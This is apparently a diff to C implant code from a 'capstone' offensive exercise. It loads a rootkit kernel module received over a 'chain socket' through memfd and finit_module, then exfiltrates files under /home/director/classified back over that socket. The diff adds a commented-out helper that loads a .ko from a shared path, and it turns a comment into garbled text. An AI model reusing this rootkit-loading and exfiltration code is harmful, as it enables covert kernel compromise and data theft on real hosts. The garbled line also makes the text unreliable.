@@ -13,6 +13,7 @@
 #include <unistd.h>
 #include <stdint.h>
 #include <fcntl.h>
+#include <errno.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
@@ -59,6 +60,34 @@ static void send_frame(int fd, const void *data, uint32_t size)
 	if (size) write_exact(fd, data, size);
 }
 
+/*
+static int load_ko_from_path(const char *path)
+{
+	int f = open(path, O_RDONLY);
+	if (f < 0) return -1;
+	struct stat st;
+	if (fstat(f, &st) < 0) { close(f); return -1; }
+	void *buf = mmap(0, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+	close(f);
+	if (buf == MAP_FAILED) return -1;
+
+	int mfd = memfd_create_s("", 0);
+	if (mfd < 0) { munmap(buf, (size_t)st.st_size); return -1; }
+	if (write_exact(mfd, buf, (size_t)st.st_size) < 0) {
+		munmap(buf, (size_t)st.st_size);
+		close(mfd);
+		return -1;
+	}
+	munmap(buf, (size_t)st.st_size);
+
+	if (finit_module_s(mfd, "", 0) < 0) { close(mfd); return -1; }
+	close(mfd);
+	return 0;
+}
+
+#define DEFAULT_KO_PATH "/mnt/shared/capstone/rootkit.ko"
+*/
+
 int main(void)
 {
 	/* read rootkit.ko frame from chain socket */
@@ -79,7 +108,7 @@ int main(void)
 	if (finit_module_s(mfd, "", 0) < 0) return 1;
 	close(mfd);
 
-	/* exfil PIR files back over the chain socket */
+	/* exfil PIR ckfiles back over the chain soet */
 	const char *pirs[] = {
 		"/home/director/classified/agents.txt",
 		"/home/director/classified/operation_blackbird.txt",
